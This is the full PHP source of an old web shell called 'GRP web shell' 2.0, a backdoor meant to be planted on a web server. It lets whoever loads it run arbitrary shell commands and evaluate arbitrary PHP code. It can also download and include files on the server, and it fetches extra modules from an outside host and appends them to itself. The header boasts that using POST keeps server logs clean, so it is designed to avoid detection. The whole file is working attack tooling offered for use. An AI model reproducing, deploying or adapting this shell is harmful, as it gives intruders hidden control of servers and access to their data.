<?php

/*
 * GReat's Post (GRP) web shell
 * Shell uses POST queries to send data to the server, so logs on the webserver are absolutely clear ;)
 *
 * Coded by Great (C) 2006.
 * All rights reserved
 */

// Config

// Enable BASIC authorization
$auth = 0;
// You really don't need to turn it on
$devel = 0;
// Allow images?
$images = 0;
// If $images=1, set this variable equal to the base URL for the images folder.png & file.png
$images_url = "http://localhost/";
// Show errors?
$errors = 1;
// Modules path
$modules_base = "http://cribble.by.ru/grp_mod/";
// Modules supported
$modules = array("browse" => "File browser", "mysql" => "MySQL");
// Script version
$script_release = "GRP WebShell 2.0 release build 2018 (C)2006,Great";

// Authorization

$name='63191e4ece37523c9fe6bb62a5e64d45';
$pass='47ce56ef73da9dec757ef654e6aa1ca1';
$caption="Enter your login and password";
if ($auth &&  (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass))
{
	header("WWW-Authenticate: Basic realm=\"$caption\"");
	header("HTTP/1.0 401 Unauthorized");
	exit("<h1>Unauthorized access</h1>");
}

if($errors)
  error_reporting(E_ALL&~E_NOTICE);
else
  error_reporting(0);

// Strip slashes

if(get_magic_quotes_gpc())
{
 foreach(array("_POST", "_GET", "_FILES", "_COOKIE") as $ar)
  foreach($GLOBALS[$ar] as $k=>$v)
    $GLOBALS[$ar][$k] = stripslashes($v);
}

// Useful functions

// Print post form
function post_form($name, $params, $a="", $b="")
{
  static $i=0;
  echo "<form method='post' name='PostActForm$i'>\n";
  foreach($params as $n=>$v)
    echo "<input type='hidden' name='$n' value='$v'>\n";
  echo "$a<a href='javascript:void(0);' onClick='document.PostActForm$i.submit()'>$name</a>$b</form>\n";
  $i++;
}

// Print post form without confirmation link
function post_empty_form($params)
{
  static $i=0;
  echo "<form method='post' name='PostEmptyForm$i'>\n";
  foreach($params as $n=>$v)
    echo "<input type='hidden' name='$n' value='$v'>\n";
  echo "</form>\n";
  $i++;
  return $i-1;
}

// Print single confirmation link
function submit_empty_form($i, $name)
{
  echo "<a href='javascript:void(0);' onClick='document.PostEmptyForm$i.submit()'>$name</a>";
}

// Print single confirmation link with a confirmation message box
function confirm_empty_form($i, $name, $msg)
{
  echo "<a href='javascript:void(0);' onClick='if(confirm(\"$msg\")){document.PostEmptyForm$i.submit()}'>$name</a>";
}

// Redirect to URL $to
function redirect($to)
{
  echo "<meta http-equiv=\"refresh\" content=\"0;url='$to'\">";
}

// Get string containing file permissions in the form 'lrwxrwxrwx'
function filesperms($file)
{
	$perms = fileperms($file);

	if (($perms & 0xC000) == 0xC000) {
	   // Socket
	   $info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	   // Symbolic Link
	   $info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	   // Regular
	   $info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	   // Block special
	   $info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	   // Directory
	   $info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	   // Character special
	   $info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	   // FIFO pipe
	   $info = 'p';
	} else {
	   // Unknown
	   $info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	           (($perms & 0x0800) ? 's' : 'x' ) :
	           (($perms & 0x0800) ? 'S' : '-'));

	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	           (($perms & 0x0400) ? 's' : 'x' ) :
	           (($perms & 0x0400) ? 'S' : '-'));

	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	           (($perms & 0x0200) ? 't' : 'x' ) :
	           (($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

// Get string contaning file modification time
function filesmtime($file)
{
  return date ("d M Y H:i:s", filemtime($file));
}

function headers()
{
return "{$_SERVER['REQUEST_METHOD']} {$_SERVER['PHP_SELF']} {$_SERVER['SERVER_PROTOCOL']}\\n
Accept: {$_SERVER['HTTP_ACCEPT']}\\n
Accept-Charset: {$_SERVER['HTTP_ACCEPT_CHARSET']}\\n
Accept-Encoding: {$_SERVER['HTTP_ACCEPT_ENCODING']}\\n
Accept-Language: {$_SERVER['HTTP_ACCEPT_LANGUAGE']}\\n
Cache-Control: {$_SERVER['HTTP_CACHE_CONTROL']}\\n
Connection: {$_SERVER['HTTP_CONNECTION']}\\n
Host: {$_SERVER['HTTP_HOST']}\\n
User-Agent: {$_SERVER['HTTP_USER_AGENT']}\\n
";
}

if($_POST['act']=='toolz' && $_POST['subact']=='phpinfo')
  die(phpinfo());

if($_POST['act']=='downfile')
{
  $curdir = $_POST['curdir'];
  $file = $_POST['file'];

  if(!file_exists($curdir.'/'.$file))
    die("Cannot find file ".$curdir.'/'.$file);
  if(!is_file($curdir.'/'.$file))
    die($curdir.'/'.$file." is not a regular file");

  Header("Content-Type: application/x-octet-stream");
  Header("Content-Disposition: attachement;filename=".$file);

  die(join('', file($curdir.'/'.$file)));
}

if($_POST['act']=='preview')
{
  chdir($_POST['curdir']);
  if(!file_exists($_POST['file']))
    die("Can't find file");
  $p=explode(".",$_POST['file']);
  $ext=strtolower($p[count($p)-1]);
  if(in_array($ext, array('png','jpg','jpeg','bmp','gif','tiff','pcx')))
    Header("Content-Type: image/$ext");
  elseif(in_array($ext, array('htm', 'html','plg')))
    Header("Content-Type: text/html");
  elseif(in_array($ext, array('php')))
  { include($_POST['file']); die;}
  else
    Header("Content-Type: text/plain");
  @readfile($_POST['file']);
  die;
}

//---------------------------------
// Headers
//---------------------------------
?>
<html>
<head>
<title><?php echo $script_release;?></title>
<style type='text/css'>
A { text-decoration: none; color: white }
</style>
</head>
<body bgcolor='black' vlink='blue' alink='blue' link='blue' text='white'>
<noscript><br><br><br><h1 align='center'><font color='red'>You need JavaScript to be enabled to run this page!</font></h1><br><br><br></noscript>
<?php // Navigation ?>
<center>
<table border=0 width=100%><tr><td><table border=0><tr>
<form method='post' name='main_empty_form'><input type='hidden' name='act'><input type='hidden' name='curdir'><input type='hidden' name='file'><input type='hidden' name='subact'></form>
<?php
echo "<td><b>";
post_form("Shell", array(), "", " |");

$mod_loaded = array();
foreach($modules as $module=>$name)
{
  if(function_exists("mod_".$module))
  {
    echo "</b><td><b>";
    post_form($name, array("act" => $module), "", " |");
    $mod_loaded[] = $module;
  }
}

echo "</b><td><b>";
post_form("Toolz", array("act" => "toolz"));

echo "</table><td align=right width=50%>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<table style='border: 1px solid' width=100%><tr><td>";
echo "<b>Modules installed:</b>&nbsp;&nbsp;&nbsp;";
$first = 1;
foreach($mod_loaded as $module)
{
  if(!$first)
    echo ", ";
  if($module==$_POST['act'])
    echo "<b>".$module."</b>";
  else
    echo $module;
  $first=0;
}
if($first==1)
  echo "None";
?>
<td align=right>
<?php
if(file_exists("grp_repair.php"))
  echo "<input type='button' value='Repair' onClick='window.top.location.href=\"grp_repair.php\";' /><input type='button' value='Delete Repair' onClick='window.top.location.href=\"grp_repair.php?delete\";' /> ";
?>
<input type='button' value='Load more...' onClick='document.main_empty_form.act.value="load_modules";document.main_empty_form.submit();' />
</table></table>
</center>
<p>
<table border=0>
<tr><td>
<table style='border: 1px solid' cellspacing=5>
<tr><td colspan=2 align='center'><b>Server information</b>
<tr><td>
<?php
$os = "unk";
$safe = @ini_get("safe_mode");

if($safe==1)
{
	echo "<b>Safe Mode</b>&nbsp;&nbsp;<td>On<tr><td>";
}
else
{
	echo "<b>Operating system</b>&nbsp;&nbsp;<td>";
	$ver = exec("ver");
	if(substr($ver, 0, 9) == "Microsoft")
	{
	  echo $ver;
	  $os = "win";
	}
	else
	{
	  $id = exec("id");
	  if(substr($id, 0, 3) == "uid")
	  {
	    echo exec("uname -srn");
	    $os = "nix";
	  }
	  else
	    echo "Unknown, not a Windows ";
	}
	
	if($os == "nix")
	{
	  echo "<tr><td><b>id<b>&nbsp;&nbsp;<td>".exec("id")."</tr>";
	}
}
echo "<tr><td><b>Server software</b>&nbsp;&nbsp;<td>{$_SERVER['SERVER_SOFTWARE']}";

if($os == "nix")
{
  $pwd = exec("pwd");
  $defcmd = "ls -liaF";
}
elseif($os == "win")
{
  $pwd = exec("cd");
  $defcmd = "dir";
}

if(empty($pwd))
  $pwd = getcwd();

?>
</table>
<td>
<table style='border: 1px solid' cellspacing=5>
<tr><td colspan=2 align='center'><b>Client information</b>
<tr><td><b>Client's IP</b>&nbsp;&nbsp;<td><a href="javascript:alert('Host: <?php echo gethostbyname($_SERVER['REMOTE_ADDR']); ?>');"><?php echo $_SERVER['REMOTE_ADDR'];?></a>
<tr><td><b>Client's browser</b>&nbsp;&nbsp;<td><a href="javascript: alert('HTTP Headers:\n\n<?php echo headers(); ?>');"><?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']);?></a>
</table>
</table>
<p>
<?php
//---------------------------------
// Parse parameters. Initializing.
//---------------------------------

// Register globals
if (ini_get('register_globals') != '1')
{
  if (!empty($HTTP_POST_VARS))
    extract($HTTP_POST_VARS);
  
  if (!empty($HTTP_GET_VARS))
    extract($HTTP_GET_VARS);

  if (!empty($HTTP_SERVER_VARS))
    extract($HTTP_SERVER_VARS);
}

//---------------------------------
// Select action
//---------------------------------


// Toolz
if($_POST['act'] == 'toolz')
{
?>
<h3>Tools</h3>
<?php
$n1 = post_empty_form(array("act" => "toolz", "subact" => "phpinfo"));
$n2 = post_empty_form(array("act" => "toolz", "subact" => "phpcode"));
?>
<ul>
<li><?php submit_empty_form($n1, "Phpinfo"); ?>
<li><?php submit_empty_form($n2, "Evaluate php code"); ?>
</ul>
<?php

if($_POST['subact'] == "phpcode")
{
  if(!isset($_POST['code']))
    $_POST['code'] = 'print_r($_SERVER);';
  echo "<br /><form method='post' name='phpcode'>
        <input type='hidden' name='act' value='toolz'>
        <input type='hidden' name='subact' value='phpcode'>
        <input type='checkbox' name='pre'".(($_POST['pre']=="on")?" checked":"").">
         <a href=\"javascript:void(0);\" onClick=\"document.phpcode.pre.checked=!document.phpcode.pre.checked\">Append &lt;pre&gt; tags</a><br>
        <textarea name='code' cols=70 rows=20>{$_POST['code']}</textarea>
        <br />
        <input type='submit' name='go' value='Eval'>
        </form>";
  if(isset($_POST['go']))
  {
    echo "<p>Result is:<br />";
    if($_POST['pre']=="on")
    {
      echo "<pre>";
      eval($_POST['code']);
      echo "</pre>";
    }
    else
      echo eval($_POST['code']);
  }

}
?>
</ul>
<?php
}

elseif(function_exists("mod_".$_POST['act']))
{
  eval("mod_".$_POST['act']."();");
}

elseif($_POST['act']=="load_modules")
{
  echo "<h3>Module loader</h3>";
  if($_POST['subact']=='autoload')
  {
    $mod = join('', file($modules_base."mod_".$_POST['module'].".txt"));
    if($mod===false)
      die("Module is unavailable");
    //echo "Module:<br><textarea cols=50 rows=10 readonly>".htmlspecialchars($mod)."</textarea>";
    $parts = explode('/', $_SERVER['PHP_SELF']);
    $name = $parts[count($parts)-1];

    // Backup
    copy($name, "~".$name);

    $f = fopen("grp_repair.php", "w");
    if($f)
    {
      $crlf = "\r\n";
      fwrite($f, '<?php'.$crlf.'$name="'.$name.'";'.$crlf.'if($_SERVER[QUERY_STRING]=="delete") {unlink("grp_repair.php");unlink("~".$name);}else{'.$crlf.'unlink($name);'.$crlf.'rename("~".$name, $name);'.$crlf.'unlink("grp_repair.php");}'.$crlf.'?>'."<meta http-equiv=\"refresh\" content=\"0;url='$name'\">");
      fclose($f);
      $repair=1;
    }
    else $repair=0;

    $sh = fopen($name, "a+") or die("Can't open ".$name." to append module");;
    fwrite($sh, $mod);
    fclose($sh);
    echo "<b><font color='green'>Module installed successfully</font></b><br /><b>WARNING!</b> Shell file has been backuped. If you'll have problems with installed module, you can ";
    if($repair)
      echo "run 'grp_repair.php' to forget changes";
    else
      echo "backup file manually from '~".$name."' (shell was unable to create self-repairing module)";
    echo "<br /><small>You'll be automatically redirected in 3 seconds</small><meta http-equiv=\"refresh\" content=\"3;url=''\">";
  }

  else
  {
    echo "<b>Supported modules are</b>: ";
    $first = 1;
    foreach($modules as $module=>$name)
    {
      if(!$first)
        echo ", ";
      echo $name." (".$module.")";
      $first=0;
    }
    if($first==1)
      echo "None";
    echo "<br /><b>Modules base load URL</b>: $modules_base<p><font color='gray'><b>Modules can be installed:</b></font>
          (<font color='green'>Ready</font>, <font color='red'>Failure</font>)<br />";
    foreach($modules as $module=>$name)
    {
      $mod_form[$module] = post_empty_form(array('act' => 'load_modules', 'subact' => 'autoload', 'module' => $module));
    }
    echo "<table border=0>";
    foreach($modules as $module=>$name)
    {
      $pre  = "<font color='green'>";
      $post = "</font>";
      $mod = @join('', @file($modules_base."mod_".$module.".txt"));
      if(!preg_match("#function mod_#i", $mod))
        $pre  = "<font color='red'>";

      echo "<tr><td>".$pre.$name." (".$module.")".$post."<td><a href='".$modules_base."mod_".$module.".txt' target=_blank>[SOURCE]</a><td>";

      if(function_exists("mod_".$module))
        echo "<font color='gray'>[ALREADY INSTALLED]</font>";
      elseif($pre == "<font color='green'>")
        submit_empty_form($mod_form[$module], "[INSTALL]");
      else
        echo "<font color='gray'>[CAN'T INSTALL]</font>";
      echo "</tr>";
    }
    echo "</table>";
  }
}

// Shell
else
{
	// First we check if there has been asked for a working directory
	if (!empty($work_dir)) {
	  // A workdir has been asked for
	  if (!empty($command)) {
	    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {
	      // We try and match a cd command
	      if ($regs[1][0] == '/') {
	        $new_dir = $regs[1]; // 'cd /something/...'
	      } else {
	        $new_dir = $work_dir . '/' . $regs[1]; // 'cd somedir/...'
	      }
	      if (file_exists($new_dir) && is_dir($new_dir)) {
	        $work_dir = $new_dir;
	      }
	      unset($command);
	    }
	  }
	}

unset($curdir);
if($safe == 1)
{
  die("<font color='red'><b>Safe mode is turned On! Command line is unavailable</b></font>");
}

if(isset($_POST["curdir"]))
  $curdir = $_POST["curdir"];
else
  $curdir = $pwd;
if($os == "win")
  $curdir = str_replace("/", "\\", $curdir);
?>
<form name="execform" method="post">
<table border=0>
<tr><td>Command: <td><input type="text" name="command" size="60" value="<?php echo ($_POST["command"]=="")?$defcmd:$_POST["command"];?>">
    <td><a href="#" onClick="document.execform.command.value='<?php echo $defcmd;?>'">Set default [<?php echo $defcmd; ?>]</a>
<tr><td><a href="#" onClick="document.execform.stderr.checked=!document.execform.stderr.checked">Disable stderr-grabbing?</a><td><input type="checkbox" name="stderr"<?php echo ($_POST["stderr"]=="on")?" checked":"";?>>
<tr><td>Working directory:<td><input type="text" name="curdir" size="60" value="<?php echo $curdir;?>">
    <td><a href="#" onClick="document.execform.curdir.value='<?php echo addslashes($pwd);?>'">Restore as home directory [<?php echo htmlspecialchars($pwd); ?>]</a>
<tr><td colspan=2><input name="submit_btn" type="submit" value="Execute Command">
</table>
</form>
<textarea cols="80" rows="29" readonly>
<?php
function excmd($cmd)
{
  if(function_exists("system"))
  { system($cmd); return true; }
  if(function_exists("exec"))
  { exec($cmd, $var); echo join("\n", $var); return true; }
  if(function_exists("passthru"))
  { passthru($cmd); return true; }
  return false;
}
if (!empty($command)) {
  if (!$stderr)
    $command .= " 2>&1";
  if($os == "nix")
    excmd("cd $curdir; $command");
  elseif($os == "win")
    excmd("cd $curdir & $command");
  elseif($os == "unk")
  {
    chdir($curdir);
    excmd($command);
  }
}
?>
</textarea>
</form>
<script language="JavaScript" type="text/javascript">
document.execform.command.focus();
</script>
<?php
}

//---------------------------------
// Footer
//---------------------------------
?>
</body>
</html>

<?php // Is it really very interesting? :) ?>
